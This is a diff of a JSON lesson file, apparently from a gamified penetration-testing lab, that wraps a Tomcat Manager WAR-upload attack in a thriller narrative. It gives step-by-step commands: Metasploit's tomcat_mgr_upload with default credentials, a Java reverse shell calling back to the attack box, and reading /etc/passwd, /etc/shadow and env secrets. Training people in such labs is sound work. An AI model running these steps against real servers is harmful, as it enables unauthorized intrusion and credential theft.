@@ -7,107 +7,122 @@
   "port": 8080,
   "short_description": "Upload a malicious WAR file to Tomcat Manager for remote code execution.",
   "description": "Apache Tomcat's Manager application allows deploying web apps. If you have valid credentials (often defaults like tomcat/tomcat), you can upload a malicious WAR file that gives you a shell. This is a common attack against misconfigured Java servers.",
+
+  "episode_number": 3,
+  "episode_title": "THE DEPLOYMENT",
+  "next_episode_id": "sambacry",
+
+  "handler_message": "The Tomcat server at 172.20.0.19 handles Cerberus deployment staging. This is where their operators push code to production systems.\n\nDavid Chen's notes mentioned 'active builds' on this server. Whatever NIGHTFALL is, pieces of it are being assembled here. Marcus Webb signed off on a deployment three days ago.\n\nThe Manager interface uses default credentials. Sloppy, but these internal systems were never meant to be exposed.\n\nGet inside. Find out what they're building. The clock is ticking.",
+
+  "episode_intro": "David Chen knew something. He was building evidence, screenshots, logs. And then he vanished.\n\nHis notes pointed here - Cerberus's internal deployment infrastructure. If NIGHTFALL is real, if it's more than paranoid speculation, the proof is on this server.\n\nYour hands are shaking. You haven't slept in thirty hours. The car outside your building moved yesterday, but you don't know where it went.\n\nFocus. One target at a time.",
+
+  "episode_outro": "The build manifests confirm it. NIGHTFALL isn't just real - it's almost ready.\n\nSCADA-BRIDGE. That's what they're calling it. A toolkit designed to compromise industrial control systems. Power grids. Water treatment. Gas pipelines.\n\nThe deployment is scheduled for 72 hours from now. And buried in the code comments, you find something worse: Chinese language strings. Mandarin error messages. Beijing IP addresses hardcoded as 'attribution markers.'\n\nThey're not just planning an attack. They're planning to frame another country for it.\n\nYou need to move faster. The executive file shares might have the authorization chain - who approved this, who funded it, who benefits.\n\nBut as you disconnect, a notification flashes in your peripheral vision. A new device just connected to your home network.\n\nThey're getting closer.",
+
+  "interstitial": {
+    "title": "Episode 3: THE DEPLOYMENT",
+    "content": "PREVIOUSLY: You found the first references to NIGHTFALL on a forgotten FTP server. A scheduling document. A list of internal IPs. And a name - David Chen.\n\nDavid was a senior systems administrator at Cerberus. Twenty years of experience. TS/SCI clearance. He started asking questions about NIGHTFALL three weeks ago.\n\nThen he disappeared.\n\nYou accessed his home workstation. His browser history told the story - he was scared, he was gathering evidence, he was trying to figure out who to trust.\n\nHe never found out. But you found what he left behind: screenshots of internal memos, and a Tomcat deployment URL.\n\nWhatever Cerberus is building, it's on that server. And you need to get inside."
+  },
+
   "steps": [
     {
-      "title": "Scan Tomcat",
+      "title": "Scan the deployment server",
       "command": "nmap -sV 172.20.0.19 -p 8080",
-      "explanation": "Verify Tomcat is running on port 8080.",
+      "narrative": "First rule of engagement: verify your target. Nmap with -sV does service version detection - it doesn't just tell you a port is open, it tells you what's listening. For a Tomcat server, this confirms the version and helps identify potential vulnerabilities. Cerberus runs their deployment pipeline here. Time to see what version they're running.",
       "expected": "8080/tcp open http Apache Tomcat",
       "duration": "5-10 sec"
     },
     {
-      "title": "Check for Manager interface",
+      "title": "Probe the Manager interface",
       "command": "curl -I http://172.20.0.19:8080/manager/html",
-      "explanation": "The Manager app is at /manager/html. It requires authentication.",
+      "narrative": "Tomcat's Manager application is the control panel for deployments - it's where administrators upload new web applications. The -I flag makes curl show only headers, a quick way to check if an endpoint exists without downloading content. A 401 Unauthorized response is actually good news: the interface exists and is protected by credentials. We just need to find them.",
       "expected": "401 Unauthorized (authentication required)",
       "duration": "1-2 sec"
     },
     {
-      "title": "Start Metasploit",
+      "title": "Initialize the attack framework",
       "command": "msfconsole -q",
-      "explanation": "We'll use Metasploit's Tomcat exploit.",
+      "narrative": "Metasploit is the industry-standard penetration testing framework. The -q flag starts it quietly, skipping the ASCII art banner. What you're about to do - uploading a malicious WAR file - is the same technique real attackers use. The difference is authorization. You're exposing a conspiracy. They're just trying to profit.",
       "duration": "5-15 sec"
     },
     {
-      "title": "Load the exploit",
+      "title": "Select the Tomcat exploit module",
       "command": "use exploit/multi/http/tomcat_mgr_upload",
-      "explanation": "This module creates a WAR file with a payload and uploads it via the Manager."
+      "narrative": "This exploit automates everything: it creates a WAR (Web Application Archive) containing a payload, uploads it through the Manager interface, triggers it, and catches the resulting shell. Cerberus should have changed the defaults. They didn't. That's the gap you're walking through."
     },
     {
-      "title": "Configure the target",
+      "title": "Set the target host",
       "command": "set RHOSTS 172.20.0.19",
-      "explanation": "Set the target IP."
+      "narrative": "RHOSTS defines the remote host - your target. In a real engagement, this might be a list of IPs. Today it's singular: the Cerberus deployment server. Every keystroke brings you deeper into their infrastructure."
     },
     {
-      "title": "Set the port",
+      "title": "Configure the target port",
       "command": "set RPORT 8080",
-      "explanation": "Tomcat runs on 8080."
+      "narrative": "Tomcat typically runs on 8080, the conventional alternative HTTP port. Corporate firewalls often block standard ports but allow high-numbered ones. It's security through obscurity - and it never works."
     },
     {
-      "title": "Set Manager credentials",
+      "title": "Enter the username",
       "command": "set HttpUsername tomcat",
-      "explanation": "Default Tomcat Manager username."
+      "narrative": "The default Tomcat Manager username. David Chen's notes mentioned this would work on internal systems. Cerberus didn't think anyone would ever reach this server. They were wrong."
     },
     {
-      "title": "Set the password",
+      "title": "Enter the password",
       "command": "set HttpPassword tomcat",
-      "explanation": "Default password. In real scenarios, try common defaults or brute force."
+      "narrative": "Default credentials. The most common vulnerability in the world isn't a zero-day exploit - it's laziness. 'tomcat/tomcat' ships with the installation. Millions of servers never change it. Neither did Cerberus."
     },
     {
-      "title": "Choose a payload",
+      "title": "Choose your payload",
       "command": "set PAYLOAD java/shell_reverse_tcp",
-      "explanation": "Use a Java reverse shell payload. This is more reliable than meterpreter for Tomcat."
+      "narrative": "A reverse shell means the target connects back to you, bypassing firewalls that block inbound connections. Java/shell_reverse_tcp is reliable on Tomcat - no dependencies, works across platforms. When this triggers, you'll have command execution on the deployment server."
     },
     {
-      "title": "Set your listener IP",
+      "title": "Set your callback address",
       "command": "set LHOST 172.20.0.5",
-      "explanation": "This is the Kali attack box IP where the shell connects back."
+      "narrative": "LHOST is where the shell phones home - your attack box. This IP needs to be reachable from the target. When the payload executes, it opens a connection back to this address. Metasploit will be listening."
     },
     {
       "title": "Execute the exploit",
       "command": "run",
-      "explanation": "Metasploit creates a WAR, uploads it, triggers execution, and catches the shell.",
+      "narrative": "This is it. Metasploit packages the payload into a WAR file, authenticates to the Manager, uploads it as a 'legitimate' application, deploys it, triggers execution, and catches the callback. In seconds, you're inside Cerberus infrastructure. The deployment server that's building NIGHTFALL.",
       "expected": "[*] Command shell session 1 opened",
       "duration": "5-15 sec"
     },
     {
-      "title": "Check your access (no prompt - just type!)",
+      "title": "Verify shell access",
       "command": "id",
-      "explanation": "IMPORTANT: There is NO prompt. The cursor is just blinking. Type 'id' and press Enter anyway - it works! Raw reverse shells don't show a prompt.",
+      "narrative": "Raw reverse shells don't show a prompt - the cursor just blinks. Don't let that fool you. Type 'id' and press Enter. The response tells you who you are on the target system. Root means full control. You're inside.",
       "expected": "uid=0(root) gid=0(root) groups=0(root)"
     },
     {
-      "title": "Upgrade to a real prompt",
+      "title": "Upgrade to interactive shell",
       "command": "/bin/bash -i",
-      "explanation": "Raw reverse shells have no prompt. This spawns an interactive bash so you get a familiar prompt. (python3 pty.spawn works too if available)",
-      "expected": "root@<container>:/# prompt appears"
+      "narrative": "Raw shells are functional but awkward - no prompt, no command history, Ctrl+C kills your session. Spawning an interactive bash gives you a proper terminal experience. Small quality-of-life improvement that matters during extended reconnaissance."
     },
     {
-      "title": "Explore the system",
+      "title": "Enumerate system users",
       "command": "cat /etc/passwd",
-      "explanation": "List system users to understand the environment."
+      "narrative": "The passwd file lists every user account on the system. Look for service accounts, admin users, anything suggesting multiple operators. Each username is a potential target for lateral movement. Each is someone who might know about NIGHTFALL."
     },
     {
-      "title": "Check the network",
+      "title": "Map the network position",
       "command": "ip addr",
-      "explanation": "See network interfaces. You're inside the Docker network now - potential pivot point."
+      "narrative": "Now you're inside, you need to understand where 'inside' is. The ip addr command shows network interfaces - what networks this server can reach. Internal systems are rarely isolated. This deployment server might have access to production, to databases, to other targets."
     },
     {
-      "title": "Look for other targets",
+      "title": "Discover internal hosts",
       "command": "cat /etc/hosts",
-      "explanation": "Docker often adds other container hostnames here. These are your next targets."
+      "narrative": "Docker environments often expose other containers through the hosts file. These are your next targets. Each internal hostname is another system Cerberus thought was safe. Each is another piece of the NIGHTFALL puzzle."
     },
     {
-      "title": "One-command pwn (after you learn it)",
+      "title": "Automated exploitation (bonus)",
       "command": "pwn tomcat",
-      "explanation": "Exit the shell (type 'exit' twice) and try this. Now that you understand the attack, this script runs all the Metasploit steps automatically. Use it to demo or practice faster."
+      "narrative": "Now that you understand the attack chain, the 'pwn' script automates it. Exit your shell (type 'exit' twice) and run this from Kali. Same result, faster execution. Use it for practice or demonstrations. But always understand what's happening under the hood."
     }
   ],
   "pwn_command": "pwn tomcat",
-  "success_criteria": "You have a root shell with a proper prompt and can explore the compromised system.",
+  "success_criteria": "You have a root shell on the Cerberus deployment server. You can explore the system, examine build artifacts, and understand what NIGHTFALL actually is.",
   "next_steps": [
-    "Run 'env' to find secrets in environment variables",
-    "Check 'cat /etc/shadow' to grab password hashes",
-    "Scan internal network: ping 172.20.0.10 (DVWA)"
+    "Search for build manifests: find / -name '*.manifest' 2>/dev/null",
+    "Check environment variables for secrets: env",
+    "Look for deployment logs: ls -la /var/log/"
   ]
 }
